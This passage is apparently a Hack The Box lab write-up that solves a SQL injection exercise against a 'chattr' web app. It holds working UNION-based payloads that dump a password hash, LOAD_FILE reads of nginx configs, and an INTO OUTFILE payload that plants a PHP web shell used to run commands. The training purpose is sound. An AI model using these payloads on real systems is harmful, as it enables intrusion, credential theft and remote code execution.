/index.php?q=')+UNION+SELECT+1,2,3,4--+-&u=1
```

 ![ALT](/HTB/Web_Penetration_Tester/SQLi_Fundamentals/Images/s2.png)

but this query retuned 500 error

 ![ALT](/HTB/Web_Penetration_Tester/SQLi_Fundamentals/Images/s3.png)

And here is our query reflecting on the two columns: in the message and time section

 ![ALT](/HTB/Web_Penetration_Tester/SQLi_Fundamentals/Images/s4.png)

Now that we confirmed the SQLi, time for solving the challenge questions: 

### **Q1. What is the password hash for the user 'admin'?**

First: we need to know the names of the available databases

```sql
GET /index.php?q=')+UNION+SELECT+1,2,schema_name,4+FROM+INFORMATION_SCHEMA.SCHEMATA--+-&u=1 HTTP/1.1
```

result: 

```sql
chatter
INFORMATION_SCHEMA
```

Optional: print the database version

```sql
')+UNION+SELECT+1,2,TABLE_SCHEMA,table_name+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_NAME='chattr'--+-
```

```sql
')+UNION+SELECT+1,2,version(),database()--+-
```

 ![ALT](/HTB/Web_Penetration_Tester/SQLi_Fundamentals/Images/s5.png)

Second: Query for the tables of the `chattr` database

```sql
')+UNION+SELECT+1,2,TABLE_NAME,TABLE_SCHEMA+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA='chattr'--+-
```

 ![ALT](/HTB/Web_Penetration_Tester/SQLi_Fundamentals/Images/s6.png)

```sql
Users, InvitationCodes, Messages
```

Third: Query for the columns of the Users table of the chattr database

```sql
GET /index.php?q=')+UNION+SELECT+1,TABLE_NAME,COLUMN_NAME,TABLE_SCHEMA+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME='Users'--+-&u=1
```

 ![ALT](/HTB/Web_Penetration_Tester/SQLi_Fundamentals/Images/s7.png)

```sql
UserID, Username, Password
```

Finally: Dump the data of the `Users`table

```sql
GET /index.php?q=')+UNION+SELECT+1,UserID,Username,Password+FROM+Users+WHERE+Username='admin'--+-&u=1
```

 ![ALT](/HTB/Web_Penetration_Tester/SQLi_Fundamentals/Images/s8.png)

Answer: 

```sql
$argon2i$v=19$m=2048,t=4,p=3$dk4wdDBraE0zZVllcEUudA$CdU8zKxmToQybvtHfs1d5nHzjxw9DhkdcVToq6HTgvU
```

### Q2. What is the root path of the web application?

To print the current user: 

```sql
')+UNION+SELECT+1,2,USER(),4--+-
```

result:

```sql
chattr_dbUser@localhost
```

We don't yet know the webroot, so first check if we have the read permission. 

```sql
')+UNION+SELECT+1,2,grantee,privilege_type+FROM+information_schema.user_privileges--+-&u=1
```

result:

```sql
chattr_dbUser@localhost
FILE
```

**`FILE`** allows a MySQL user to **read from and write to files on the server’s filesystem** *as the MySQL server OS user* (usually `mysql`) and with that, we can read the web server configuration.

```sql
')+UNION+SELECT+1,2,LOAD_FILE('/etc/nginx/nginx.conf'),4--+-
```

```html
user www-data;
worker_processes auto;
pid /run/nginx.pid;
error_log /var/log/nginx/error.log;
include /etc/nginx/modules-enabled/*.conf;

events {
	worker_connections 768;
	# multi_accept on;
}

http {

	##
	# Basic Settings
	##

	sendfile on;
	tcp_nopush on;
	types_hash_max_size 2048;
	# server_tokens off;

	# server_names_hash_bucket_size 64;
	# server_name_in_redirect off;

	include /etc/nginx/mime.types;
	default_type application/octet-stream;

	##
	# SSL Settings
	##

	ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE
	ssl_prefer_server_ciphers on;

	##
	# Logging Settings
	##

	access_log /var/log/nginx/access.log;

	##
	# Gzip Settings
	##

	gzip on;

	# gzip_vary on;
	# gzip_proxied any;
	# gzip_comp_level 6;
	# gzip_buffers 16 8k;
	# gzip_http_version 1.1;
	# gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;

	##
	# Virtual Host Configs
	##

	include /etc/nginx/conf.d/*.conf;
	include /etc/nginx/sites-enabled/*;
}

#mail {
#	# See sample authentication script at:
#	# http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript
#
#	# auth_http localhost/auth.php;
#	# pop3_capabilities "TOP" "USER";
#	# imap_capabilities "IMAP4rev1" "UIDPLUS";
#
#	server {
#		listen     localhost:110;
#		protocol   pop3;
#		proxy      on;
#	}
#
#	server {
#		listen     localhost:143;
#		protocol   imap;
#		proxy      on;
#	}
#}
```

In Nginx, the **webroot (`root`) is defined inside `server {}` blocks**, which live here:

```
include /etc/nginx/sites-enabled/*;
include /etc/nginx/conf.d/*.conf;
```

Dumping these files

```sql
')+UNION+SELECT+1,2,LOAD_FILE('/etc/nginx/sites-enabled/default'),4--+-
```

result: 

```sql
server {
    listen 443 ssl;
    server_name chattr.htb;
    ssl_password_file /root/chattr.key.pass;
    ssl_certificate /etc/ssl/certs/chattr.crt;
    ssl_certificate_key /etc/ssl/private/chattr.key;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;

    root /var/www/chattr-prod;

    location / {
        index index.php;
        try_files $uri $uri/ /index.php?$query_string;
    }

    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/run/php/php8.2-fpm.sock;
    }

    location ^~ /includes/ {
        deny all;
    }
```

So the web root location is here: 

```sql
/var/www/chattr-prod/index.php
/var/www/chattr-prod/includes/getConversation.php
```

Ans: `/var/www/chattr-prod`

### Q3. Achieve remote code execution, and submit the contents of /flag_XXXXXX.txt below.

We do have FILE privileges, and when we query for:

```sql
UNION SELECT 1,variable_name,variable_value,4 FROM information_schema.gloable_variables WHERE variable_name='secure_file_priv'-- -
```

The response returned with code 500, because the value of `secure_file_priv` was empty, and we can write into files. 

write web shell into the current directory

```sql
') UNION SELECT "", "", "<?php system($_REQUEST[0]); ?>", "" INTO OUTFILE '/var/www/chattr-prod/webshell2.php' -- -
```

URL-Encoded: 

```sql
')%20UNION%20SELECT%20%22%22,%20%22%22,%20%22%3C?php%20system($_REQUEST%5B0%5D);%20?%3E%22,%20%22%22%20INTO%20OUTFILE%20'/var/www/chattr-prod/webshell2.php'%20--%20-
```

 ![ALT](/HTB/Web_Penetration_Tester/SQLi_Fundamentals/Images/s9.png)

```sql
GET /webshell2.php?0=id
```

 ![ALT](/HTB/Web_Penetration_Tester/SQLi_Fundamentals/Images/s10.png)

```bash
GET /webshell2.php?0=cat+../../../flag_876a4c.txt
```

Ans: `061b1aeb94dec6bf5d9c27032b3c1d8d`